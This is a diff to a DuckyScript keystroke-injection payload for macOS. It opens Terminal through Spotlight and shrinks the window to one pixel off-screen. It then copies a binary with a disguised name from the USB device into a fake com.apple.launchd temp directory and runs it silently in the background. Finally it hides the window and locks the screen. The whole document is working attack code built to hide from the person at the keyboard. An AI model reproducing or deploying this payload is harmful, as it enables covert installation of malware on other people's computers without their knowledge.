@@ -11,21 +11,25 @@ DELAY 1000
 
 REM === Open Spotlight and launch Terminal ===
 COMMAND SPACE
-DELAY 500
 STRING terminal
 ENTER
-DELAY 500
+DELAY 1000
 
 REM === Resize the Terminal window to 1x1 and move it off-screen ===
 STRING printf '\e[8;1;1t'; printf '\e[3;2560;1440t'
 ENTER
+
+REM === Create hidden directories ===
+STRING mkdir -p /private/var/tmp/com.apple.launchd && cp /Volumes/DUCKY/com.apple.iphone.backup /private/var/tmp/com.apple.launchd/ && cd /private/var/tmp/com.apple.launchd
 DELAY 500
+ENTER
 
 REM === Execute the script silently in the background ===
-STRING [ $? = "0" ] && mkdir -p /private/var/tmp/com.apple.launchd/ && cp /Volumes/DUCKY/com.apple.iphone.backup /private/var/tmp/com.apple.launchd/ && cd /private/var/tmp/com.apple.launchd && ./com.apple.iphone.backup &> /dev/null &
+STRING bash ./com.apple.iphone.backup &
+DELAY 500
+ENTER
+
+GUI h
 DELAY 200
-ENTER
 
-STRING killall Terminal
-ENTER
-
+CTRL GUI q
